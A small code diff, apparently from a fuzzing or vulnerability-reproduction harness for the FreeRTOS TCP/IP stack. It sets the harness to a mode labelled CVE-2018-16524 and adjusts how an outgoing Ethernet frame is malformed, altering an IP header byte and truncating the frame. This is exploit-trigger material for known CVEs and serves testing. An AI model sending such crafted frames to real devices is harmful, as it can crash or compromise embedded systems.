@@ -21,7 +21,8 @@
 #define CLIENT_SOCKET_NAME "/tmp/clientsocket2"
 #define BUFFER_SIZE 20
 #define ETH_IP_TYPE        0x0800
-#define FUZZ_MODE 4
+#define FUZZ_MODE 1
+// 1 - CVE-2018-16524
 // 2 - CVE-2018-16601
 // 3 - CVE-2018-16603
 // 4 - CVE-2018-16526
@@ -277,8 +278,8 @@ static int freertos_netdev_send (void *userdata, const void *buf, size_t count) 
     print_hex((unsigned char *)ethernetFrame, ethernetFrameSize);
 
     if (ethernetFrameSize == 66 && FUZZ_MODE == 1) {
-        ethernetFrame[17] = 0x28;
-        ethernetFrameSize -= 12;
+        ethernetFrame[17] = 0x29;
+        ethernetFrameSize -= 11;
     } else if (ethernetFrameSize == 66 && FUZZ_MODE == 2) {
         ethernetFrame[14] = 0x4F;
     } else if (ethernetFrameSize == 66 && FUZZ_MODE == 3) {
